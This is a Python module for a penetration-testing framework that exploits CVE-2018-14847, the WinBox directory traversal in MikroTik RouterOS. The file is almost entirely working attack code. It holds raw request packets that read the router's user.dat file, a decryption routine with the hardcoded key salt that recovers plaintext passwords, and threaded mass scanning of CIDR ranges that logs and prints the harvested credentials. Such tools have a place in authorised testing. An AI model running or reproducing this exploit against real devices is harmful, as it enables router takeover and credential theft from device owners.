import hashlib
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

INIT_PKT = bytearray([
    0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
    0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
    0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
    0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
    0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
    0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
    0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
    0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
    0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
    0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
    0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
    0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
    0x00, 0x00,
])

FILE_REQ_PKT = bytearray([
    0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
    0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
    0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
    0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
    0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
    0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
    0x00, 0x02, 0x00, 0x00, 0x00,
])

@dataclass
class HostResult:
    host: str
    port: int
    vulnerable: bool = False
    creds: list = field(default_factory=list)
    error: str | None = None

class MikrotikWinboxCreds(Auxiliary):
    NAME = "MikroTik WinBox Credential Leak (CVE-2018-14847)"
    DESCRIPTION = (
        "Exploits the WinBox directory traversal in MikroTik RouterOS <= 6.42 "
        "to read /flash/rw/store/user.dat and decrypt the plaintext credentials. "
        "Supports single hosts, comma lists, CIDR, ranges, and file: target specs."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "great"
    SEVERITY = "critical"
    DISCLOSED = "2018-08-01"
    CHECK = True
    REFERENCES = [
        "CVE-2018-14847",
        "https://nvd.nist.gov/vuln/detail/CVE-2018-14847",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=8291, type=int, description="WinBox port"),
        Option("TIMEOUT", default=3.0, type=float, description="per-connection timeout"),
        Option("THREADS", default=50, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first successful credential leak"),
    ]

    def _expand_targets(self) -> list[str]:
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets — set RHOSTS (or use run <target>)")
        if len(hosts) > 1:
            print(colors.info(f"target list -> {len(hosts)} hosts"))
        return hosts

    @staticmethod
    def _decrypt_pwd(usr: bytes, pwd_enc: bytes) -> str:
        key = hashlib.md5(usr + b"283i4jfkai3389").digest()
        pwd = "".join(
            chr(pwd_enc[i] ^ key[i % len(key)]) for i in range(len(pwd_enc))
        )
        return pwd.split("\x00")[0]

    def _extract_creds_from_entry(self, entry: bytes):
        usr_data = entry.split(b"\x01\x00\x00\x21")[1]
        pwd_data = entry.split(b"\x11\x00\x00\x21")[1]
        usr_len = usr_data[0]
        pwd_len = pwd_data[0]
        usr_bytes = usr_data[1:1 + usr_len]
        usr = usr_bytes.decode("utf-8", "backslashreplace")
        pwd = self._decrypt_pwd(usr_bytes, pwd_data[1:1 + pwd_len])
        return usr, pwd

    def _parse_creds(self, data: bytes):
        creds = set()
        entries = data.split(b"M2")[1:]
        for entry in entries:
            try:
                creds.add(self._extract_creds_from_entry(entry))
            except Exception:
                continue
        return creds

    def _exploit_host(self, ip: str):
        port = self.options["RPORT"]
        timeout = self.options["TIMEOUT"]
        try:
            with socket.create_connection((ip, port), timeout=timeout) as s:
                s.settimeout(timeout)
                s.sendall(INIT_PKT)
                resp = bytearray(s.recv(1024))
                if len(resp) < 39:
                    return False, set(), "short init response"
                session_id = resp[38]
                req = bytearray(FILE_REQ_PKT)
                req[19] = session_id
                s.sendall(req)
                data = bytearray(s.recv(4096))
                if len(data) <= 55:
                    return False, set(), "no data (likely patched)"
                blob = bytes(data[55:])
                if len(blob) < 25:
                    return False, set(), "short blob"
                creds = self._parse_creds(blob)
                if not creds:
                    return False, set(), "no credentials parsed"
                return True, creds, None
        except socket.timeout:
            return False, set(), "timeout"
        except (socket.error, ConnectionRefusedError) as e:
            return False, set(), type(e).__name__
        except Exception as e:
            return False, set(), type(e).__name__

    def _check_host(self, ip: str) -> HostResult:
        res = HostResult(host=ip, port=self.options["RPORT"])
        vuln, creds, err = self._exploit_host(ip)
        res.vulnerable = vuln
        res.creds = sorted(creds)
        res.error = err
        return res

    def _record_host_result(self, h):
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, h.port,
            proto="tcp", state="open",
            name="winbox", banner="MikroTik RouterOS (vulnerable)",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2018-14847",
            info="WinBox traversal | " + str(len(h.creds)) + " cred(s) leaked",
        )
        for user, pwd in h.creds:
            self.report_cred(
                h.host, user, pwd,
                kind="password",
                info="CVE-2018-14847 WinBox user.dat leak",
            )

    def check(self):
        targets = self._expand_targets()
        if len(targets) > 1:
            print(colors.warn(
                f"check on multiple targets: probing only {targets[0]} "
                f"(use 'run' to scan all {len(targets)})"
            ))
        host = targets[0]
        print(colors.info(f"check: probing {host}:{self.options['RPORT']}"))
        res = self._check_host(host)
        if res.vulnerable:
            print(colors.vuln(
                f"check: {host} vulnerable — {len(res.creds)} credential(s) exposed"
            ))
            return CheckResult.VULNERABLE
        if res.error:
            print(colors.safe(f"check: {host} not vulnerable ({res.error})"))
        return CheckResult.SAFE

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info(f"scanning {len(targets)} host(s) with {threads} threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits: list[HostResult] = []
        errors = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._check_host, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        res = fut.result()
                    except Exception:
                        errors += 1
                        continue
                    if res.vulnerable:
                        hits.append(res)
                        for user, pwd in res.creds:
                            bar.log(colors.vuln(f"{res.host} — {user}:{pwd}"))
                        if workspace_active:
                            self._record_host_result(res)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif res.error:
                        errors += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print(f"  targets:      {len(targets)}")
        print(f"  vulnerable:   {colors.green(str(len(hits)))}")
        print(f"  errors/skips: {colors.dimmed(str(errors))}")
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            total_creds = sum(len(h.creds) for h in hits)
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s), {total_creds} cred(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  credentials leaked:"))
            for h in hits:
                for user, pwd in h.creds:
                    print(f"    {colors.vuln(h.host)}  {colors.session(user)}:{pwd}")

        return hits
